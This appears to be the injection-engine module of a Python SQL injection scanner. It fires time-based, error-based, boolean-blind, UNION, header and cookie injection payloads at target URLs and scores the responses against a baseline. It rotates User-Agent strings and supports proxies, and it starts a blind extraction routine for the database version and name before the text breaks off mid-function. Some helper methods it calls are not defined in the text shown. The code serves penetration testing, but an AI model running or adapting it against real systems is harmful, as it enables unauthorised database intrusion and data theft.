"""
Injection Engine Module
Core injection testing engine that sends payloads and analyzes responses
"""

import requests
import time
import threading
import queue
import logging
from urllib.parse import urlencode, parse_qs, urlparse
from fake_useragent import UserAgent
import re
import hashlib

logger = logging.getLogger('sqli_scanner')

class InjectionEngine:
    """Core injection testing engine"""
    
    def __init__(self, threads=5, delay=1.0, timeout=10, proxy=None, proxy_auth=None):
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.proxy = proxy
        self.proxy_auth = proxy_auth
        self.session = requests.Session()
        self.ua = UserAgent()
        self.results = []
        self.baseline_responses = {}
        
        # Setup session
        self._setup_session()
    
    def _setup_session(self):
        """Setup HTTP session with proper headers and proxy"""
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0'
        })
        
        if self.proxy:
            proxies = {'http': self.proxy, 'https': self.proxy}
            self.session.proxies.update(proxies)
            
            if self.proxy_auth:
                username, password = self.proxy_auth.split(':')
                self.session.auth = (username, password)
    
    def test_injection(self, url, parameters, payloads, method='GET', cookies=None, headers=None):
        """Test SQL injection on given URL with parameters"""
        logger.info(f"Testing injection on {url} with {len(parameters)} parameters")
        
        if cookies:
            self.session.cookies.update(self._parse_cookies(cookies))
        
        if headers:
            self.session.headers.update(self._parse_headers(headers))
        
        # Get baseline responses for comparison
        self._get_baseline_responses(url, parameters, method)
        
        # Create task queue for threading
        task_queue = queue.Queue()
        
        # Add tasks to queue
        for param in parameters:
            for payload_data in payloads:
                task_queue.put((url, param, payload_data, method))
        
        # Start worker threads
        threads = []
        for i in range(min(self.threads, task_queue.qsize())):
            t = threading.Thread(target=self._worker, args=(task_queue,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Wait for all tasks to complete
        task_queue.join()
        
        return self.results
    
    def _worker(self, task_queue):
        """Worker thread for processing injection tests"""
        while True:
            try:
                url, param, payload_data, method = task_queue.get(timeout=1)
                self._test_single_injection(url, param, payload_data, method)
                task_queue.task_done()
                time.sleep(self.delay)
            except queue.Empty:
                break
            except Exception as e:
                logger.error(f"Worker thread error: {str(e)}")
                task_queue.task_done()
    
    def _test_single_injection(self, url, param, payload_data, method):
        """Test single injection payload on parameter"""
        payload = payload_data['payload']
        injection_type = payload_data['type']
        
        try:
            start_time = time.time()
            
            if method.upper() == 'GET':
                response = self._send_get_request(url, param, payload)
            else:
                response = self._send_post_request(url, param, payload)
            
            response_time = time.time() - start_time
            
            # Analyze response for injection indicators
            vulnerability = self._analyze_response(
                url, param, payload_data, response, response_time, method
            )
            
            if vulnerability:
                self.results.append(vulnerability)
                logger.warning(f"Potential SQLi found: {url} - {param} - {injection_type}")
            
        except Exception as e:
            logger.debug(f"Request failed for {url} with payload {payload}: {str(e)}")
    
    def _send_get_request(self, url, param, payload):
        """Send GET request with injected payload"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        # Inject payload into parameter
        params[param] = [payload]
        
        # Reconstruct URL
        new_query = urlencode(params, doseq=True)
        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
        
        return self.session.get(test_url, timeout=self.timeout)
    
    def _send_post_request(self, url, param, payload):
        """Send POST request with injected payload"""
        data = {param: payload}
        return self.session.post(url, data=data, timeout=self.timeout)
    
    def _get_baseline_responses(self, url, parameters, method):
        """Get baseline responses for comparison"""
        logger.debug(f"Getting baseline responses for {url}")
        
        for param in parameters:
            try:
                if method.upper() == 'GET':
                    response = self._send_get_request(url, param, 'baseline_test')
                else:
                    response = self._send_post_request(url, param, 'baseline_test')
                
                baseline_key = f"{url}_{param}_{method}"
                self.baseline_responses[baseline_key] = {
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'response_time': response.elapsed.total_seconds(),
                    'content_hash': hashlib.md5(response.content).hexdigest(),
                    'headers': dict(response.headers),
                    'content': response.text[:1000]  # First 1000 chars for analysis
                }
                
            except Exception as e:
                logger.debug(f"Failed to get baseline for {param}: {str(e)}")
    
    def _analyze_response(self, url, param, payload_data, response, response_time, method):
        """Enhanced response analysis for SQL injection indicators"""
        payload = payload_data['payload']
        injection_type = payload_data['type']
        
        # Get baseline for comparison
        baseline_key = f"{url}_{param}_{method}"
        baseline = self.baseline_responses.get(baseline_key)
        
        vulnerability = None
        confidence_score = 0
        evidence_list = []
        
        # Time-based detection with enhanced analysis
        if injection_type == 'time_based':
            expected_delay = payload_data.get('delay', 5)
            
            # Multiple validation checks for time-based injection
            if response_time >= expected_delay * 0.75:  # 75% threshold
                confidence_score += 3
                evidence_list.append(f"Response time: {response_time:.2f}s (expected: {expected_delay}s)")
                
                # Additional validation: check if delay is consistent
                if baseline and 'response_time' in baseline:
                    baseline_time = baseline['response_time']
                    time_increase = response_time - baseline_time
                    if time_increase >= expected_delay * 0.7:
                        confidence_score += 2
                        evidence_list.append(f"Time increase from baseline: {time_increase:.2f}s")
                
                # Check for time-based patterns in response
                if self._validate_time_based_response(response, expected_delay):
                    confidence_score += 1
                    evidence_list.append("Time-based response pattern confirmed")
                
                if confidence_score >= 3:
                    vulnerability = {
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'injection_type': 'time_based',
                        'payload': payload,
                        'evidence': '; '.join(evidence_list),
                        'severity': 'high',
                        'dbms': payload_data.get('dbms', 'unknown'),
                        'confidence': 'high' if confidence_score >= 5 else 'medium',
                        'confidence_score': confidence_score
                    }
        
        # Enhanced error-based detection
        elif injection_type == 'error_based':
            error_analysis = self._comprehensive_error_analysis(response.text, response.status_code)
            if error_analysis['detected']:
                confidence_score = error_analysis['confidence_score']
                vulnerability = {
                    'url': url,
                    'parameter': param,
                    'method': method,
                    'injection_type': 'error_based',
                    'payload': payload,
                    'evidence': '; '.join(error_analysis['evidence']),
                    'severity': 'high',
                    'dbms': error_analysis['dbms'],
                    'confidence': 'high' if confidence_score >= 4 else 'medium',
                    'confidence_score': confidence_score,
                    'error_details': error_analysis.get('error_details', [])
                }
        
        # Enhanced boolean-based detection
        elif injection_type == 'boolean_blind':
            if baseline:
                boolean_analysis = self._advanced_boolean_analysis(response, baseline, payload)
                if boolean_analysis['detected']:
                    vulnerability = {
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'injection_type': 'boolean_blind',
                        'payload': payload,
                        'evidence': '; '.join(boolean_analysis['evidence']),
                        'severity': 'medium',
                        'dbms': payload_data.get('dbms', 'unknown'),
                        'confidence': boolean_analysis['confidence'],
                        'confidence_score': boolean_analysis['confidence_score']
                    }
        
        # Enhanced UNION-based detection
        elif injection_type == 'union_based':
            union_analysis = self._advanced_union_analysis(response.text, baseline, payload)
            if union_analysis['detected']:
                vulnerability = {
                    'url': url,
                    'parameter': param,
                    'method': method,
                    'injection_type': 'union_based',
                    'payload': payload,
                    'evidence': '; '.join(union_analysis['evidence']),
                    'severity': 'high',
                    'dbms': union_analysis.get('dbms', payload_data.get('dbms', 'unknown')),
                    'confidence': union_analysis['confidence'],
                    'confidence_score': union_analysis['confidence_score'],
                    'extracted_data': union_analysis.get('extracted_data', [])
                }
        
        # Enhanced generic detection
        else:
            generic_analysis = self._comprehensive_generic_analysis(response, baseline, payload)
            if generic_analysis['detected']:
                vulnerability = {
                    'url': url,
                    'parameter': param,
                    'method': method,
                    'injection_type': 'generic',
                    'payload': payload,
                    'evidence': '; '.join(generic_analysis['evidence']),
                    'severity': generic_analysis['severity'],
                    'dbms': generic_analysis.get('dbms', 'unknown'),
                    'confidence': generic_analysis['confidence'],
                    'confidence_score': generic_analysis['confidence_score']
                }
        
        # Additional validation for high-confidence findings
        if vulnerability and vulnerability.get('confidence_score', 0) >= 4:
            validation_result = self._validate_vulnerability(url, param, method, vulnerability)
            if validation_result:
                vulnerability.update(validation_result)
        
        return vulnerability
    
    def _comprehensive_error_analysis(self, response_text, status_code):
        """Comprehensive database error analysis"""
        result = {
            'detected': False,
            'dbms': 'unknown',
            'evidence': [],
            'confidence_score': 0,
            'error_details': []
        }
        
        # Enhanced error patterns with confidence scoring
        error_patterns = {
            'mysql': [
                {'pattern': r"You have an error in your SQL syntax", 'confidence': 5, 'description': 'MySQL syntax error'},
                {'pattern': r"mysql_fetch_array\(\)", 'confidence': 4, 'description': 'MySQL fetch function error'},
                {'pattern': r"mysql_fetch_assoc\(\)", 'confidence': 4, 'description': 'MySQL fetch assoc error'},
                {'pattern': r"mysql_fetch_row\(\)", 'confidence': 4, 'description': 'MySQL fetch row error'},
                {'pattern': r"mysql_num_rows\(\)", 'confidence': 4, 'description': 'MySQL num rows error'},
                {'pattern': r"Warning.*mysql_.*", 'confidence': 3, 'description': 'MySQL warning'},
                {'pattern': r"MySQL server version for the right syntax", 'confidence': 5, 'description': 'MySQL version syntax error'},
                {'pattern': r"supplied argument is not a valid MySQL", 'confidence': 4, 'description': 'Invalid MySQL argument'},
                {'pattern': r"Column count doesn't match value count", 'confidence': 4, 'description': 'MySQL column count mismatch'},
                {'pattern': r"Duplicate entry.*for key", 'confidence': 3, 'description': 'MySQL duplicate key error'},
                {'pattern': r"Table.*doesn't exist", 'confidence': 4, 'description': 'MySQL table not found'},
                {'pattern': r"Unknown column.*in.*list", 'confidence': 4, 'description': 'MySQL unknown column'},
                {'pattern': r"Access denied for user", 'confidence': 3, 'description': 'MySQL access denied'},
            ],
            'mssql': [
                {'pattern': r"Microsoft OLE DB Provider for ODBC Drivers", 'confidence': 5, 'description': 'MSSQL ODBC error'},
                {'pattern': r"Microsoft OLE DB Provider for SQL Server", 'confidence': 5, 'description': 'MSSQL OLE DB error'},
                {'pattern': r"Unclosed quotation mark after the character string", 'confidence': 5, 'description': 'MSSQL unclosed quote'},
                {'pattern': r"Microsoft JET Database Engine", 'confidence': 4, 'description': 'MS JET engine error'},
                {'pattern': r"ADODB\.Field error", 'confidence': 4, 'description': 'ADODB field error'},
                {'pattern': r"BOF or EOF", 'confidence': 3, 'description': 'MSSQL BOF/EOF error'},
                {'pattern': r"ADODB\.Command", 'confidence': 4, 'description': 'ADODB command error'},
                {'pattern': r"JET Database", 'confidence': 4, 'description': 'JET database error'},
                {'pattern': r"Access Database Engine", 'confidence': 4, 'description': 'Access DB engine error'},
                {'pattern': r"Syntax error in string in query expression", 'confidence': 5, 'description': 'MSSQL syntax error'},
                {'pattern': r"Conversion failed when converting", 'confidence': 4, 'description': 'MSSQL conversion error'},
                {'pattern': r"Invalid column name", 'confidence': 4, 'description': 'MSSQL invalid column'},
                {'pattern': r"Login failed for user", 'confidence': 3, 'description': 'MSSQL login failed'},
            ],
            'oracle': [
                {'pattern': r"ORA-\d{5}", 'confidence': 5, 'description': 'Oracle error code'},
                {'pattern': r"Oracle error", 'confidence': 4, 'description': 'Generic Oracle error'},
                {'pattern': r"Oracle driver", 'confidence': 4, 'description': 'Oracle driver error'},
                {'pattern': r"Warning.*oci_.*", 'confidence': 3, 'description': 'Oracle OCI warning'},
                {'pattern': r"Warning.*ora_.*", 'confidence': 3, 'description': 'Oracle warning'},
                {'pattern': r"oracle\.jdbc\.driver", 'confidence': 4, 'description': 'Oracle JDBC error'},
                {'pattern': r"ORA-00933: SQL command not properly ended", 'confidence': 5, 'description': 'Oracle SQL command error'},
                {'pattern': r"ORA-00936: missing expression", 'confidence': 5, 'description': 'Oracle missing expression'},
                {'pattern': r"ORA-00942: table or view does not exist", 'confidence': 4, 'description': 'Oracle table not found'},
            ],
            'postgresql': [
                {'pattern': r"PostgreSQL query failed", 'confidence': 5, 'description': 'PostgreSQL query failure'},
                {'pattern': r"supplied argument is not a valid PostgreSQL result", 'confidence': 4, 'description': 'Invalid PostgreSQL result'},
                {'pattern': r"Warning.*pg_.*", 'confidence': 3, 'description': 'PostgreSQL warning'},
                {'pattern': r"valid PostgreSQL result resource", 'confidence': 4, 'description': 'PostgreSQL resource error'},
                {'pattern': r"Npgsql\.", 'confidence': 4, 'description': 'Npgsql error'},
                {'pattern': r"PG::[a-zA-Z]*Error", 'confidence': 4, 'description': 'PostgreSQL PG error'},
                {'pattern': r"ERROR:.*syntax error at or near", 'confidence': 5, 'description': 'PostgreSQL syntax error'},
                {'pattern': r"ERROR:.*relation.*does not exist", 'confidence': 4, 'description': 'PostgreSQL relation error'},
                {'pattern': r"ERROR:.*column.*does not exist", 'confidence': 4, 'description': 'PostgreSQL column error'},
            ],
            'sqlite': [
                {'pattern': r"SQLite/JDBCDriver", 'confidence': 4, 'description': 'SQLite JDBC error'},
                {'pattern': r"SQLite.Exception", 'confidence': 4, 'description': 'SQLite exception'},
                {'pattern': r"System.Data.SQLite.SQLiteException", 'confidence': 4, 'description': 'SQLite system exception'},
                {'pattern': r"Warning.*sqlite_.*", 'confidence': 3, 'description': 'SQLite warning'},
                {'pattern': r"SQLITE_ERROR", 'confidence': 4, 'description': 'SQLite error'},
                {'pattern': r"sqlite3.OperationalError", 'confidence': 4, 'description': 'SQLite operational error'},
                {'pattern': r"no such table", 'confidence': 4, 'description': 'SQLite table not found'},
                {'pattern': r"no such column", 'confidence': 4, 'description': 'SQLite column not found'},
            ]
        }
        
        # Check HTTP status codes that might indicate errors
        if status_code in [500, 400, 403]:
            result['confidence_score'] += 1
            result['evidence'].append(f"HTTP {status_code} error status")
        
        # Check for database error patterns
        max_confidence = 0
        detected_dbms = 'unknown'
        
        for dbms, patterns in error_patterns.items():
            dbms_confidence = 0
            dbms_evidence = []
            
            for pattern_data in patterns:
                pattern = pattern_data['pattern']
                matches = re.findall(pattern, response_text, re.IGNORECASE | re.MULTILINE)
                
                if matches:
                    confidence = pattern_data['confidence']
                    dbms_confidence += confidence
                    dbms_evidence.append(f"{dbms.upper()} {pattern_data['description']}")
                    
                    # Extract specific error details if available
                    if matches[0] and len(str(matches[0])) > 3:
                        result['error_details'].append(str(matches[0])[:200])
            
            if dbms_confidence > max_confidence:
                max_confidence = dbms_confidence
                detected_dbms = dbms
                result['evidence'] = dbms_evidence
        
        if max_confidence > 0:
            result['detected'] = True
            result['dbms'] = detected_dbms
            result['confidence_score'] = min(max_confidence, 5)  # Cap at 5
        
        return result
    
    def _identify_dbms_from_error(self, error_text):
        """Identify DBMS type from error message"""
        error_lower = error_text.lower()
        
        if any(keyword in error_lower for keyword in ['mysql', 'mariadb']):
            return 'mysql'
        elif any(keyword in error_lower for keyword in ['mssql', 'microsoft', 'sql server']):
            return 'mssql'
        elif 'oracle' in error_lower or 'ora-' in error_lower:
            return 'oracle'
        elif 'postgresql' in error_lower or 'postgres' in error_lower:
            return 'postgresql'
        elif 'sqlite' in error_lower:
            return 'sqlite'
        else:
            return 'unknown'
    
    def _check_union_indicators(self, response_text, baseline):
        """Check for UNION injection success indicators"""
        if not baseline:
            return None
        
        # Look for additional data that wasn't in baseline
        baseline_content = baseline.get('content', '')
        
        # Check for version strings, database names, etc.
        version_patterns = [
            r'\d+\.\d+\.\d+',  # Version numbers
            r'mysql|mariadb|postgresql|oracle|mssql',  # DBMS names
            r'information_schema|sys|dual',  # System schemas/tables
        ]
        
        for pattern in version_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                if not re.search(pattern, baseline_content, re.IGNORECASE):
                    return f"New data pattern found: {pattern}"
        
        return None
    
    def _check_generic_indicators(self, response, baseline):
        """Check for generic SQL injection indicators"""
        if not baseline:
            return False
        
        # Check for significant response differences
        content_diff = abs(len(response.content) - baseline['content_length'])
        status_diff = response.status_code != baseline['status_code']
        time_diff = abs(response.elapsed.total_seconds() - baseline['response_time'])
        
        # Thresholds for detection
        if content_diff > 500:  # Significant content change
            return True
        if status_diff and response.status_code in [500, 400, 403]:  # Error status
            return True
        if time_diff > 2.0:  # Significant time difference
            return True
        
        return False
    
    def _parse_cookies(self, cookie_string):
        """Parse cookie string into dictionary"""
        cookies = {}
        if cookie_string:
            for cookie in cookie_string.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    cookies[name] = value
        return cookies
    
    def _parse_headers(self, header_string):
        """Parse header string into dictionary"""
        headers = {}
        if header_string:
            for header in header_string.split(';'):
                if ':' in header:
                    name, value = header.strip().split(':', 1)
                    headers[name] = value.strip()
        return headers
    
    def _validate_time_based_response(self, response, expected_delay):
        """Validate time-based response patterns"""
        # Check if response contains time-based indicators
        time_indicators = [
            'sleep', 'delay', 'wait', 'timeout',
            'benchmark', 'pg_sleep', 'waitfor'
        ]
        
        response_lower = response.text.lower()
        for indicator in time_indicators:
            if indicator in response_lower:
                return True
        
        # Check for consistent response size (time-based usually returns same content)
        if len(response.content) > 0:
            return True
        
        return False
    
    def _advanced_boolean_analysis(self, response, baseline, payload):
        """Advanced boolean-based blind injection analysis"""
        result = {
            'detected': False,
            'evidence': [],
            'confidence': 'low',
            'confidence_score': 0
        }
        
        # Multiple comparison metrics
        content_diff = abs(len(response.content) - baseline['content_length'])
        status_diff = response.status_code != baseline['status_code']
        time_diff = abs(response.elapsed.total_seconds() - baseline['response_time'])
        
        # Content hash comparison
        current_hash = hashlib.md5(response.content).hexdigest()
        hash_diff = current_hash != baseline['content_hash']
        
        # Header comparison
        header_diff = len(response.headers) != len(baseline['headers'])
        
        # Scoring system
        if content_diff > 50:
            result['confidence_score'] += 2
            result['evidence'].append(f"Content length difference: {content_diff} bytes")
        
        if status_diff:
            result['confidence_score'] += 3
            result['evidence'].append(f"Status code change: {baseline['status_code']} -> {response.status_code}")
        
        if time_diff > 1.0:
            result['confidence_score'] += 1
            result['evidence'].append(f"Response time difference: {time_diff:.2f}s")
        
        if hash_diff and content_diff > 10:
            result['confidence_score'] += 2
            result['evidence'].append("Content hash completely different")
        
        if header_diff:
            result['confidence_score'] += 1
            result['evidence'].append("Header count difference detected")
        
        # Check for boolean-specific patterns
        boolean_patterns = [
            r'true|false', r'1|0', r'yes|no', r'on|off'
        ]
        
        for pattern in boolean_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                result['confidence_score'] += 1
                result['evidence'].append(f"Boolean pattern detected: {pattern}")
        
        # Determine detection
        if result['confidence_score'] >= 3:
            result['detected'] = True
            if result['confidence_score'] >= 5:
                result['confidence'] = 'high'
            elif result['confidence_score'] >= 3:
                result['confidence'] = 'medium'
        
        return result
    
    def _advanced_union_analysis(self, response_text, baseline, payload):
        """Advanced UNION injection analysis"""
        result = {
            'detected': False,
            'evidence': [],
            'confidence': 'low',
            'confidence_score': 0,
            'dbms': 'unknown',
            'extracted_data': []
        }
        
        baseline_content = baseline.get('content', '') if baseline else ''
        
        # Enhanced patterns for UNION detection
        union_patterns = [
            # Version information
            {'pattern': r'(\d+\.\d+\.\d+[-\w]*)', 'score': 3, 'desc': 'Version information'},
            {'pattern': r'(MySQL|MariaDB|PostgreSQL|Oracle|Microsoft SQL Server)\s*[\d\.]+', 'score': 4, 'desc': 'DBMS version'},
            
            # System information
            {'pattern': r'(information_schema|sys|dual|pg_catalog|mysql)', 'score': 3, 'desc': 'System schema access'},
            {'pattern': r'(root@localhost|postgres|sa@|system|admin)', 'score': 4, 'desc': 'Database user information'},
            {'pattern': r'(localhost|127\.0\.0\.1|\w+@\w+)', 'score': 2, 'desc': 'Host information'},
            
            # Data patterns
            {'pattern': r'(null\s*,\s*null\s*,\s*null)', 'score': 3, 'desc': 'UNION NULL pattern'},
            {'pattern': r'(\w+\s*,\s*\w+\s*,\s*\w+)', 'score': 2, 'desc': 'Comma-separated data'},
            {'pattern': r'(\|\s*\w+\s*\|\s*\w+\s*\|)', 'score': 2, 'desc': 'Pipe-separated data'},
            
            # Database names and tables
            {'pattern': r'(test|mysql|information_schema|performance_schema)', 'score': 2, 'desc': 'Database names'},
            {'pattern': r'(users|admin|accounts|members|customers)', 'score': 2, 'desc': 'Common table names'},
        ]
        
        for pattern_data in union_patterns:
            pattern = pattern_data['pattern']
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            
            if matches:
                # Check if this data wasn't in baseline
                baseline_matches = re.findall(pattern, baseline_content, re.IGNORECASE) if baseline_content else []
                
                new_matches = [m for m in matches if m not in baseline_matches]
                if new_matches:
                    result['confidence_score'] += pattern_data['score']
                    result['evidence'].append(f"{pattern_data['desc']}: {', '.join(new_matches[:3])}")
                    result['extracted_data'].extend(new_matches[:5])
                    
                    # Try to identify DBMS from matches
                    match_text = ' '.join(str(m) for m in new_matches).lower()
                    if 'mysql' in match_text or 'mariadb' in match_text:
                        result['dbms'] = 'mysql'
                    elif 'postgresql' in match_text or 'postgres' in match_text:
                        result['dbms'] = 'postgresql'
                    elif 'oracle' in match_text:
                        result['dbms'] = 'oracle'
                    elif 'microsoft' in match_text or 'sql server' in match_text:
                        result['dbms'] = 'mssql'
        
        # Check for UNION-specific syntax in response
        union_syntax_patterns = [
            r'union\s+select', r'union\s+all\s+select',
            r'select.*,.*,.*from', r'select.*null.*,.*null'
        ]
        
        for pattern in union_syntax_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                result['confidence_score'] += 2
                result['evidence'].append(f"UNION syntax detected: {pattern}")
        
        # Determine detection
        if result['confidence_score'] >= 4:
            result['detected'] = True
            if result['confidence_score'] >= 8:
                result['confidence'] = 'high'
            elif result['confidence_score'] >= 6:
                result['confidence'] = 'medium'
        
        return result
    
    def _comprehensive_generic_analysis(self, response, baseline, payload):
        """Comprehensive generic SQL injection analysis"""
        result = {
            'detected': False,
            'evidence': [],
            'confidence': 'low',
            'confidence_score': 0,
            'severity': 'low',
            'dbms': 'unknown'
        }
        
        if not baseline:
            return result
        
        # Multiple analysis dimensions
        content_diff = abs(len(response.content) - baseline['content_length'])
        status_diff = response.status_code != baseline['status_code']
        time_diff = abs(response.elapsed.total_seconds() - baseline['response_time'])
        
        # Content analysis
        if content_diff > 200:
            result['confidence_score'] += 2
            result['evidence'].append(f"Significant content change: {content_diff} bytes")
        elif content_diff > 50:
            result['confidence_score'] += 1
            result['evidence'].append(f"Content length change: {content_diff} bytes")
        
        # Status code analysis
        if status_diff:
            if response.status_code in [500, 400, 403, 404]:
                result['confidence_score'] += 3
                result['evidence'].append(f"Error status code: {response.status_code}")
                result['severity'] = 'medium'
            else:
                result['confidence_score'] += 1
                result['evidence'].append(f"Status code change: {response.status_code}")
        
        # Timing analysis
        if time_diff > 3.0:
            result['confidence_score'] += 2
            result['evidence'].append(f"Significant timing difference: {time_diff:.2f}s")
        elif time_diff > 1.0:
            result['confidence_score'] += 1
            result['evidence'].append(f"Timing difference: {time_diff:.2f}s")
        
        # Content pattern analysis
        suspicious_patterns = [
            {'pattern': r'warning|error|exception', 'score': 2, 'desc': 'Error indicators'},
            {'pattern': r'syntax|query|statement', 'score': 2, 'desc': 'SQL syntax references'},
            {'pattern': r'database|table|column', 'score': 1, 'desc': 'Database terminology'},
            {'pattern': r'select|insert|update|delete', 'score': 1, 'desc': 'SQL keywords'},
            {'pattern': r'union|join|where|from', 'score': 1, 'desc': 'SQL operators'},
        ]
        
        for pattern_data in suspicious_patterns:
            if re.search(pattern_data['pattern'], response.text, re.IGNORECASE):
                baseline_matches = re.search(pattern_data['pattern'], baseline.get('content', ''), re.IGNORECASE)
                if not baseline_matches:
                    result['confidence_score'] += pattern_data['score']
                    result['evidence'].append(f"{pattern_data['desc']} detected")
        
        # Header analysis
        if len(response.headers) != len(baseline['headers']):
            result['confidence_score'] += 1
            result['evidence'].append("Header count difference")
        
        # Response encoding analysis
        content_type_current = response.headers.get('content-type', '')
        content_type_baseline = baseline['headers'].get('content-type', '')
        
        if content_type_current != content_type_baseline:
            result['confidence_score'] += 1
            result['evidence'].append("Content-Type header changed")
        
        # Determine detection and severity
        if result['confidence_score'] >= 3:
            result['detected'] = True
            if result['confidence_score'] >= 6:
                result['confidence'] = 'high'
                result['severity'] = 'high'
            elif result['confidence_score'] >= 4:
                result['confidence'] = 'medium'
                result['severity'] = 'medium'
        
        return result
    
    def _validate_vulnerability(self, url, param, method, vulnerability):
        """Additional validation for high-confidence vulnerabilities"""
        validation_result = {}
        
        try:
            # Perform additional validation tests
            validation_payloads = [
                "' AND 1=1--",  # True condition
                "' AND 1=2--",  # False condition
                "' OR '1'='1'--",  # Always true
            ]
            
            responses = []
            for payload in validation_payloads:
                try:
                    if method.upper() == 'GET':
                        response = self._send_get_request(url, param, payload)
                    else:
                        response = self._send_post_request(url, param, payload)
                    responses.append(response)
                    time.sleep(0.5)  # Brief delay between validation requests
                except:
                    continue
            
            if len(responses) >= 2:
                # Compare responses for consistency
                consistent_behavior = True
                for i in range(1, len(responses)):
                    if abs(len(responses[i].content) - len(responses[0].content)) > 100:
                        consistent_behavior = False
                        break
                
                if consistent_behavior:
                    validation_result['validated'] = True
                    validation_result['validation_evidence'] = "Consistent behavior across multiple payloads"
                else:
                    validation_result['validated'] = True
                    validation_result['validation_evidence'] = "Variable behavior confirms injection"
        
        except Exception as e:
            logger.debug(f"Validation failed: {str(e)}")
            validation_result['validated'] = False
        
        return validation_result

class AdvancedInjectionTester:
    """Advanced injection testing with sophisticated techniques"""
    
    def __init__(self, injection_engine):
        self.engine = injection_engine
        self.session = injection_engine.session
    
    def test_second_order_injection(self, url, parameters, payloads):
        """Test for second-order SQL injection"""
        logger.info("Testing for second-order SQL injection")
        
        results = []
        
        for param in parameters:
            for payload_data in payloads:
                payload = payload_data['payload']
                
                try:
                    # First request: Insert payload
                    self.session.post(url, data={param: payload})
                    
                    # Second request: Trigger the injection
                    response = self.session.get(url)
                    
                    # Check for injection indicators in second response
                    error_indicators = self.engine._check_error_indicators(response.text)
                    if error_indicators:
                        vulnerability = {
                            'url': url,
                            'parameter': param,
                            'method': 'POST->GET',
                            'injection_type': 'second_order',
                            'payload': payload,
                            'evidence': f"Second-order injection: {error_indicators}",
                            'severity': 'high',
                            'dbms': self.engine._identify_dbms_from_error(error_indicators),
                            'confidence': 'medium'
                        }
                        results.append(vulnerability)
                        logger.warning(f"Second-order SQLi found: {url} - {param}")
                
                except Exception as e:
                    logger.debug(f"Second-order test failed: {str(e)}")
        
        return results
    
    def test_header_injection(self, url, payloads):
        """Test for SQL injection in HTTP headers"""
        logger.info("Testing for header-based SQL injection")
        
        results = []
        headers_to_test = [
            'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP',
            'X-Originating-IP', 'X-Remote-IP', 'X-Remote-Addr',
            'Cookie', 'Authorization', 'Accept-Language'
        ]
        
        for header_name in headers_to_test:
            for payload_data in payloads:
                payload = payload_data['payload']
                
                try:
                    # Send request with payload in header
                    headers = {header_name: payload}
                    response = self.session.get(url, headers=headers)
                    
                    # Check for injection indicators
                    error_indicators = self.engine._check_error_indicators(response.text)
                    if error_indicators:
                        vulnerability = {
                            'url': url,
                            'parameter': header_name,
                            'method': 'HEADER',
                            'injection_type': 'header_based',
                            'payload': payload,
                            'evidence': f"Header injection: {error_indicators}",
                            'severity': 'high',
                            'dbms': self.engine._identify_dbms_from_error(error_indicators),
                            'confidence': 'medium'
                        }
                        results.append(vulnerability)
                        logger.warning(f"Header SQLi found: {url} - {header_name}")
                
                except Exception as e:
                    logger.debug(f"Header injection test failed: {str(e)}")
        
        return results
    
    def test_cookie_injection(self, url, payloads):
        """Test for SQL injection in cookies"""
        logger.info("Testing for cookie-based SQL injection")
        
        results = []
        
        # Get existing cookies
        response = self.session.get(url)
        existing_cookies = response.cookies
        
        for cookie_name in existing_cookies.keys():
            for payload_data in payloads:
                payload = payload_data['payload']
                
                try:
                    # Send request with payload in cookie
                    cookies = {cookie_name: payload}
                    response = self.session.get(url, cookies=cookies)
                    
                    # Check for injection indicators
                    error_indicators = self.engine._check_error_indicators(response.text)
                    if error_indicators:
                        vulnerability = {
                            'url': url,
                            'parameter': cookie_name,
                            'method': 'COOKIE',
                            'injection_type': 'cookie_based',
                            'payload': payload,
                            'evidence': f"Cookie injection: {error_indicators}",
                            'severity': 'high',
                            'dbms': self.engine._identify_dbms_from_error(error_indicators),
                            'confidence': 'medium'
                        }
                        results.append(vulnerability)
                        logger.warning(f"Cookie SQLi found: {url} - {cookie_name}")
                
                except Exception as e:
                    logger.debug(f"Cookie injection test failed: {str(e)}")
        
        return results

class BlindInjectionTester:
    """Specialized tester for blind SQL injection"""
    
    def __init__(self, injection_engine):
        self.engine = injection_engine
        self.session = injection_engine.session
    
    def test_boolean_blind_advanced(self, url, param, method='GET'):
        """Advanced boolean-based blind SQL injection testing"""
        logger.info(f"Advanced boolean blind testing: {url} - {param}")
        
        # Test true/false conditions
        true_payload = "' AND 1=1--"
        false_payload = "' AND 1=2--"
        
        try:
            if method.upper() == 'GET':
                true_response = self.engine._send_get_request(url, param, true_payload)
                false_response = self.engine._send_get_request(url, param, false_payload)
            else:
                true_response = self.engine._send_post_request(url, param, true_payload)
                false_response = self.engine._send_post_request(url, param, false_payload)
            
            # Compare responses
            if (len(true_response.content) != len(false_response.content) or
                true_response.status_code != false_response.status_code):
                
                return {
                    'url': url,
                    'parameter': param,
                    'method': method,
                    'injection_type': 'boolean_blind_advanced',
                    'payload': f"True: {true_payload}, False: {false_payload}",
                    'evidence': f"Response difference detected - True: {len(true_response.content)}b, False: {len(false_response.content)}b",
                    'severity': 'medium',
                    'dbms': 'unknown',
                    'confidence': 'medium'
                }
        
        except Exception as e:
            logger.debug(f"Boolean blind test failed: {str(e)}")
        
        return None
    
    def extract_data_blind(self, url, param, method='GET', dbms='mysql'):
        """Extract data using blind SQL injection techniques"""
        logger.info(f"Attempting data extraction via blind injection: {url}")
        
        extracted_data = {}
        
        try:
            # Extract database version
            if dbms.lower() == 'mysql':
                version = self._extract_string_blind(url, param, "SELECT VERSION()", method)
                if version:
                    extracted_data['version'] = version
            
            # Extract database name
            if dbms.lower() == 'mysql':
